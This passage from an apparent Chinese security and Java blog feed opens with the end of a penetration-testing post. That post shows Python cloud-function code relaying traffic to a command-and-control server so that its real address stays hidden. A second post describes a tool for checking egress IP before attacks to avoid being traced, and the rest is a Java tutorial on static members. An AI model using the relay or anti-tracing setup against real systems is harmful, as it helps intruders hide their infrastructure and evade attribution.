class="string">&#x27;path&#x27;</span> <span class="keyword">in</span> event.keys():</span><br><span class="line">            path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;headers&#x27;</span> <span class="keyword">in</span> event.keys():    </span><br><span class="line">            headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;httpMethod&#x27;</span> <span class="keyword">in</span> event.keys() <span class="keyword">and</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">            resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">            print(resp.headers)</span><br><span class="line">            print(resp.content)</span><br><span class="line">        response=&#123;</span><br><span class="line">            <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">            <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">            <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        print(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>所有部署好之后访问云函数地址，CS中没有流量，第一次尝试失败。</p><h3 id="1-2-坑点2：直接pip3-install安装库不生效"><a href="#1-2-坑点2：直接pip3-install安装库不生效" class="headerlink" title="1.2 坑点2：直接pip3 install安装库不生效"></a>1.2 坑点2：直接pip3 install安装库不生效</h3><p>回头调试时发现没有安装requests库，测试显示报错，之前没有测试直接部署了</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No module named &#x27;requests&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217987.png" alt="image-20220726200711612"></p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217133.png" alt="image-20220726200634461"></p><p>查看pip3 list确实没有</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217054.png" alt="image-20220726200808139"></p><p>pip3 install requests装一个，再次测试部署</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217927.png" alt="image-20220726200900598"></p><p>安装后发现还是不行，依然提示找不到requests，第二次尝试失败。</p><h3 id="1-3-第三次尝试成功"><a href="#1-3-第三次尝试成功" class="headerlink" title="1.3 第三次尝试成功"></a>1.3 第三次尝试成功</h3><p>52pojie中给出解决方法：</p><ol><li>切换python3.6，自带requests</li><li>指定位置重新安装requests库</li></ol><p>本次使用第二种方法，使用以下命令指定位置重新安装requests库</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd src</span><br><span class="line">pip3 install requests -t .</span><br></pre></td></tr></table></figure><p>重新部署，测试成功</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217456.png" alt="image-20220726201856660"></p><p>浏览器访问云函数地址，出现web日志</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211217358.png" alt="image-20220726204132966"></p><p>执行命令成功，源ip是变化的</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211218900.png" alt="image-20220726204340902"></p><p>修改云函数代码中协议为https，443端口，成功使用https监听连接</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/202208211218692.png" alt="image-20220726204604706"></p><p>使用沙箱分析出来的通讯地址也是云函数地址。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【工具篇】EgressIpQuery - 出口IP查询工具</title>
      <link href="post/202204292133.html"/>
      <url>post/202204292133.html</url>
      
        <content type="html"><![CDATA[<h1 id="👁‍🗨EgressIpQuery-主机出口IP查询工具"><a href="#👁‍🗨EgressIpQuery-主机出口IP查询工具" class="headerlink" title="👁‍🗨EgressIpQuery - 主机出口IP查询工具"></a>👁‍🗨EgressIpQuery - 主机出口IP查询工具</h1><p>可在攻击前或配置全局代理后使用该工具检测出口IP，避免在攻击中因代理未生效而被溯源的问题。</p><p>Github：<a href="https://github.com/Sma11New/EgressIpQuery">https://github.com/Sma11New/EgressIpQuery</a></p><h2 id="🔨工具介绍"><a href="#🔨工具介绍" class="headerlink" title="🔨工具介绍"></a>🔨工具介绍</h2><h3 id="🍜工具特点"><a href="#🍜工具特点" class="headerlink" title="🍜工具特点"></a>🍜工具特点</h3><ul><li>  图形化方便操作和展示</li><li>  支持自定义查询接口、代理</li><li>  同时查询出口IP归属</li><li>  没有第三方依赖</li></ul><h3 id="🍝java版本"><a href="#🍝java版本" class="headerlink" title="🍝java版本"></a>🍝java版本</h3><p>项目使用jdk8编写</p><h3 id="🍻使用说明"><a href="#🍻使用说明" class="headerlink" title="🍻使用说明"></a>🍻使用说明</h3><p>直接查询，使用的工具自带接口</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/164969006-db6a3168-f6ae-48fb-9a72-a72b9073ad72.png" alt="image"></p><p>也可以自定义查询接口，当主动修改接口后，会在同目录下生成EIQconfig.list接口配置文件，恢复默认接口后，会自动删除该配置文件。</p><h3 id="⭕遗留问题"><a href="#⭕遗留问题" class="headerlink" title="⭕遗留问题"></a>⭕遗留问题</h3><p>配置代理后，再次点开配置界面，代理类型会重置为socks，如果是http则需要再次选择。</p><h2 id="🐎代码分析"><a href="#🐎代码分析" class="headerlink" title="🐎代码分析"></a>🐎代码分析</h2><p>工具实现非常简单，我甚至能想到用Python怎样在不到100行写出一个又健壮又好用的同样功能的工具，不过这是第一个较为完整的Java工具项目，功能简单，主要用于熟悉Java项目流程，收获不小。</p><h3 id="🏭项目结构"><a href="#🏭项目结构" class="headerlink" title="🏭项目结构"></a>🏭项目结构</h3><p>开始使用maven管理项目，但是配置和打包重复出现问题，而且功能较简单，索性不用了，下个项目再好好研究</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image_2022-05-18_00-18-00.jpg" alt="image_2022-05-18_00-18-00"></p><p>弃用maven后结构如下：</p><ul><li>  query包下放功能逻辑相关代码</li><li>  ui包下放界面展示相关代码</li><li>  utils包下放工具类</li></ul><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220518000356290.png" alt="image-20220518000356290"></p><p>关键查询类Query如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> query;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> utils.HttpUtil;</span><br><span class="line"><span class="keyword">import</span> utils.RegUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询出口IP</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interUrl 查询接口地址</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> ip</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">doQueryIp</span><span class="params">(String interUrl)</span> </span>&#123;</span><br><span class="line">        String egressIp = <span class="keyword">null</span>;</span><br><span class="line">        String reqResult = HttpUtil.doGet(interUrl, Proxy.getProxy.schame(), Proxy.getProxy.ip(), Proxy.getProxy.port());</span><br><span class="line">        <span class="keyword">if</span> (reqResult != <span class="keyword">null</span>) &#123;</span><br><span class="line">            egressIp = RegUtil.findIp(reqResult);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> egressIp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询归属</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ip 待查询ip</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> addr</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">doQueryAddr</span><span class="params">(String ip)</span> </span>&#123;</span><br><span class="line">        String addr = <span class="keyword">null</span>;</span><br><span class="line">        String url = <span class="string">&quot;http://whois.pconline.com.cn/ipJson.jsp?ip=&quot;</span> + ip + <span class="string">&quot;&amp;json=true&quot;</span>;</span><br><span class="line">        String reqResult = HttpUtil.doGet(url, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (reqResult != <span class="keyword">null</span>) &#123;</span><br><span class="line">            addr = RegUtil.findAddr(reqResult);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>doQueryIp方法调用HttpUtil工具类中的doGet方法发起get请求，再对结果做正则匹配，获取出口IP</p><p>doQueryAddr方法同样调用HttpUtil工具类中的doGet方法发起get请求，对结果匹配归属地址，获取归属</p><h3 id="💫自定义接口Dialog"><a href="#💫自定义接口Dialog" class="headerlink" title="💫自定义接口Dialog"></a>💫自定义接口Dialog</h3><h4 id="1-巧妙地设计"><a href="#1-巧妙地设计" class="headerlink" title="1.巧妙地设计"></a>1.巧妙地设计</h4><p>起初打算整个工具是不带任何配置文件和生成文件的，但是发现使用中要想自定义接口就必须生成配置文件，因此用了这个巧妙的设计：</p><p>初始工具不带配置文件，自定义接口后，如果接口与默认接口不相同，则创建一个配置文件写入修改后的接口，当接口与默认接口相同时又会删除配置文件，而且窗口加入了<strong>恢复默认</strong>按钮，方便。因此查询逻辑是系统调用查询接口时会先优先判断是否存在配置文件，存在表示配置文件已经修改，则读取文件中的接口，不存在就是系统默认接口。</p><p>纯纯的<strong>《花里胡哨》</strong></p><p><strong>相关代码：</strong></p><p>使用静态代码块初始化，来实现初始化接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化接口列表</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        File interFile = <span class="keyword">new</span> File(interConFile);</span><br><span class="line">        <span class="comment">// 存在自定义接口配置文件，表示用户修改并自定义接口，则加载dialog时读取文件中的接口</span></span><br><span class="line">        <span class="comment">// 否则读取默认接口</span></span><br><span class="line">        <span class="keyword">if</span> (interFile.exists()) &#123;</span><br><span class="line">            interList = FileUtil.readFile(interConFile);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            interList = defaultInter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>query.Inter#setInterList</code> set时判断是否相同，并执行下一步操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * set接口，并判断是否与默认接口相同，相同删除配置文件，不同写入配置文件</span></span><br><span class="line"><span class="comment"> * 接收String</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> interList 接口List</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setInterList</span><span class="params">(String interList)</span> </span>&#123;</span><br><span class="line">    Inter.interList = TypeTransUtil.stringToList(interList);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!Inter.interList.equals(Inter.defaultInter)) &#123;</span><br><span class="line">        FileUtil.writeFile(interList, interConFile);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        FileUtil.deleteFile(interConFile);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-合法输入校验"><a href="#2-合法输入校验" class="headerlink" title="2.合法输入校验"></a>2.合法输入校验</h4><p>正则校验输入的接口是否是合法url，同样在配置代理中也校验IP端口是否合法。</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220518001338519.png" alt="image-20220518001338519"></p><h4 id="3-去重"><a href="#3-去重" class="headerlink" title="3.去重"></a>3.去重</h4><p>对接口去重处理。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息查询 </tag>
            
            <tag> 出口IP查询 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java学习之路】SE3 - static修饰符</title>
      <link href="post/20220182133.html"/>
      <url>post/20220182133.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、基本用法"><a href="#一、基本用法" class="headerlink" title="一、基本用法"></a>一、基本用法</h2><h3 id="1、静态成员变量、方法"><a href="#1、静态成员变量、方法" class="headerlink" title="1、静态成员变量、方法"></a>1、静态成员变量、方法</h3><p>static修饰的成员变量为静态成员变量，在内存中<strong>只存储一份</strong>，可以被<strong>共享修改、操作</strong>，属于类，随类产生，类加载时被初始化。</p><p>成员变量分为静态成员变量和示例成员变量：</p><ul><li>  静态成员变量：有static修饰，属于类，可使用Class.Name（推荐） 或 Project.Name（不推荐）访问，常用表示在线人数等需要共享的信息</li><li>  实例成员变量：无static修饰，存在每个对象中，使用 Project.Name访问，常表示年龄、姓名等属于每个对象的信息</li></ul><p>静态成员方法与静态成员变量一样，使用场景如下：</p><ul><li>  静态成员方法：实现一个通用的功能，比如登录</li><li>  示例成员方法：表示对象自己的行为，如添加好友、吃饭、睡觉</li></ul><p>静态成员变量内存图：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220106120926680.png" alt="image-20220106120926680"></p><p>静态成员方法内存图：</p><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220106122029190.png" alt="image-20220106122029190"></p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 在线人数，静态成员变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> onlineNumber;</span><br><span class="line">    <span class="comment">// 静态成员方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态成员方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num = User.onlineNumber;</span><br><span class="line">        System.out.println(num);</span><br><span class="line">        User.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2、使用静态方法定义工具类"><a href="#2、使用静态方法定义工具类" class="headerlink" title="2、使用静态方法定义工具类"></a>2、使用静态方法定义工具类</h3><p>利用static修饰符创建静态成员方法，并将构造器私有化，即可实现静态方法只能被类调用访问，以此实现工具类。</p><p>一般将通用重复使用的功能创建为工具类，一生成验证码为例：</p><p>封装实现工具类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 工具类，封装生成只当长度验证码</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VerifyCodeTool</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造器私有化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">VerifyCodeTool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">createVerifyCode</span><span class="params">(<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">        String charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line">        Random random = <span class="keyword">new</span> Random();</span><br><span class="line">        String verifyCode = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="comment">// 生成随机下标</span></span><br><span class="line">            <span class="keyword">int</span> index = random.nextInt(charset.length());</span><br><span class="line">            <span class="comment">// 根据下标取字符，拼接</span></span><br><span class="line">            verifyCode += charset.charAt(index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> verifyCode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用工具类，生成验证码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.print(<span class="string">&quot;输入验证码长度：&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> length = scanner.nextInt();</span><br><span class="line">        <span class="comment">// 调用工具类生成验证码</span></span><br><span class="line">        String verifyCode = VerifyCodeTool.createVerifyCode(length);</span><br><span class="line">        System.out.println(verifyCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220106211308698.png" alt="image-20220106211308698"></p><h3 id="3、使用静态方法定义数组处理工具类"><a href="#3、使用静态方法定义数组处理工具类" class="headerlink" title="3、使用静态方法定义数组处理工具类"></a>3、使用静态方法定义数组处理工具类</h3><p>创建一个数组处理工具类，要求将整数数组输出为字符串格式：[1, 2, 3, 4]，需要考虑null和空数组</p><p>ArrayUitls工具类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 将整数数组输出为 [1， 2， 3]的字符串形式</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ArrayUtils</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">toString</span><span class="params">(<span class="keyword">int</span>[] array)</span></span>&#123;</span><br><span class="line">        String arrayString = <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (array != <span class="keyword">null</span>)&#123;</span><br><span class="line">            arrayString = <span class="string">&quot;[&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">                arrayString += (i == array.length - <span class="number">1</span> ? array[i] : array[i] + <span class="string">&quot;, &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            arrayString += <span class="string">&quot;]&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arrayString;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220106215432511.png" alt="image-20220106215432511"></p><h3 id="4、static注意事项"><a href="#4、static注意事项" class="headerlink" title="4、static注意事项"></a>4、static注意事项</h3><ul><li>  静态方法只能访问静态成员，不能访问实例成员，因为实例成员属于对象</li><li>  静态方法中不能用this关键字，this表示当前对象，静态方法属于类，无对象</li></ul><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220107121018850.png" alt="image-20220107121018850"></p><h2 id="二、代码块"><a href="#二、代码块" class="headerlink" title="二、代码块"></a>二、代码块</h2><p>使用{}括起来的代码称之为代码块，分为静态代码块和构造代码块：</p><ul><li>静态代码块（使用static修饰）<br>  格式：<strong>static{}</strong><br>  特点：随类加载，自动触发，只加载一次<br>  场景：在类加载时做一些初始化操作，方便后续使用</li><li>构造代码块（无修饰，不常用）<br>  格式：**{}**<br>  特点：每次创建对象时执行该代码，在构造器之前执行<br>  情景：初始化实力实例资源</li></ul><p>静态代码块可用于初始化静态资源。</p><h2 id="三、单例设计模式"><a href="#三、单例设计模式" class="headerlink" title="三、单例设计模式"></a>三、单例设计模式</h2><p>利用static修饰符，可用来实现两种单例设计模式：<strong>饿汉模式</strong>和<strong>懒汉模式</strong>，所谓单例模式是指<strong>保证系统中，使用单例模式的类只能创建一个对象。</strong></p><h3 id="1、饿汉单例模式"><a href="#1、饿汉单例模式" class="headerlink" title="1、饿汉单例模式"></a>1、饿汉单例模式</h3><p>含义：在用类获取对象时，对象已经提前创建好。</p><p>实现：</p><ul><li>  构造器私有化</li><li>  定义一个静态变量存储对象</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 饿汉单例模式</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleInstance1</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义静态变量存储对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SingleInstance1 instance = <span class="keyword">new</span> SingleInstance1();</span><br><span class="line">    <span class="comment">// 构造器私有化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SingleInstance1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220108191215069.png" alt="image-20220108191215069"></p><h3 id="2、懒汉单例模式"><a href="#2、懒汉单例模式" class="headerlink" title="2、懒汉单例模式"></a>2、懒汉单例模式</h3><p>含义：需要对象时，才为其创建对象（延迟加载对象）。</p><p>实现：</p><ul><li>  构造器私有化</li><li>  定义一个静态变量存储对象，并私有化</li><li>  提供一个返回单例对象的方法（getInstance）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 懒汉单例模式</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SingleInstance2</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 定义私有化静态变量存储对象，未调用先置空（输出为null）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SingleInstance2 instance;</span><br><span class="line">    <span class="comment">// 定义返回单例对象的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SingleInstance2 <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 判断是否已经创建</span></span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>)&#123;</span><br><span class="line">            instance = <span class="keyword">new</span> SingleInstance2();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构造器私有化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SingleInstance2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://hexo-1302945528.cos.ap-chengdu.myqcloud.com/posts/image/image-20220108193819741.png" alt="image-20220108193819741"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>饿汉单例模式方便，但是占用内存资源，可能调用有的类并不需要实例化对象，但是饿汉单例模式默认创建一个对象。</p><p>懒汉单例模式省资源，一般用的比较多。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习之路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java学习之路】SE2 - 面向对象基础知识</title>
      <link href="post/20211162133.html"/>
      <url>post/20211162133.html</url>
      
